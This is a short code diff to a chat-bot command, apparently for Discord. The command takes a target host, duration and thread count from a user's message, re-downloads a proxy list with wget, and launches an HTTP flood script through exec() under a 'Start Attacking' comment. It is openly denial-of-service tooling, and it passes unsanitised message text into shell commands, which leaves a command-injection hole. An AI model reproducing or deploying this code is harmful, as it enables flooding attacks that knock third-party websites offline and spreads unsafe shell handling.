@@ -4,6 +4,7 @@ exports.run = async (client, message, args) => {
 
 const host = message.content.split (" ")[1]
 const duration = message.content.split (" ")[2]
+const thread = message.content.split (" ")[4]
 const ayarlar = require('../ayarlar.json');
 var room = ayarlar.commandroom;
 
@@ -28,7 +29,7 @@ exec(`rm proxies.txt`, (error, stdout, stderr) => {
 });
 exec(`wget https://raw.githubusercontent.com/apaple/Proxy/main/proxies.txt`, (error, stdout, stderr) => {
 });
-exec(`node httpburst.js ${host} proxies.txt ${duration} GET`, (error, stdout, stderr) => {
+exec(`node method.js ${host} ${duration} GET ${thread}`, (error, stdout, stderr) => {
 });
 
 // Start Attacking
